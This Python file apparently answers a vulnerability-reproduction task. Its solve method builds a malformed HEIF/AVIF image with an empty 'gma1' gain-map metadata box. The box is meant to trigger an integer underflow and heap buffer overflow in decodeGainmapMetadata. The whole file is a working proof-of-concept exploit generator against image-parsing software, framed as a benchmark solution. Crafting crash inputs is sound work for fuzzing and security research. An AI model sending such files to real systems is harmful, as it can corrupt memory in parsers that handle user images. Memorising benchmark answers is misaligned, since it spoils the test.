import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in decodeGainmapMetadata.
        The vulnerability is caused by an integer underflow when parsing the 'gma1' (Gain Map Metadata) box
        with an insufficient size, causing a size subtraction to wrap around.
        """
        
        def make_box(type_: bytes, payload: bytes) -> bytes:
            # Box size = header (8) + payload length
            return struct.pack(">I", 8 + len(payload)) + type_ + payload

        def make_fullbox(type_: bytes, version: int, flags: int, payload: bytes) -> bytes:
            # FullBox has 1 byte version and 3 bytes flags (4 bytes total)
            vf = struct.pack(">I", (version << 24) | (flags & 0xFFFFFF))
            return make_box(type_, vf + payload)

        # 1. FTYP Box
        # Major brand 'mif1', minor version 0, compatible brands 'mif1'
        ftyp_payload = b"mif1" + b"\x00\x00\x00\x00" + b"mif1"
        ftyp = make_box(b"ftyp", ftyp_payload)

        # 2. HDLR Box
        # FullBox (v=0, f=0)
        # Component type (4 bytes) = 0
        # Component subtype (4 bytes) = 'pict'
        # Reserved (12 bytes) = 0
        # Name (null-terminated string) = ""
        hdlr_payload = b"\x00" * 4 + b"pict" + b"\x00" * 12 + b"\x00"
        hdlr = make_fullbox(b"hdlr", 0, 0, hdlr_payload)

        # 3. GMA1 Box (Vulnerable)
        # Type 'gma1' corresponds to ISO 21496-1 Gain Map Metadata.
        # The vulnerability is triggered by an empty or truncated payload.
        # If the parser expects a minimum header size inside the payload and subtracts it
        # from the total size without checking, 'size - min' wraps around.
        gma1 = make_box(b"gma1", b"")

        # 4. IPCO Box (Item Property Container)
        # Contains the property boxes
        ipco = make_box(b"ipco", gma1)

        # 5. IPRP Box (Item Properties)
        # Contains ipco
        iprp = make_box(b"iprp", ipco)

        # 6. META Box
        # FullBox (v=0, f=0). Contains hdlr and iprp.
        meta = make_fullbox(b"meta", 0, 0, hdlr + iprp)

        # Combine to form the PoC
        return ftyp + meta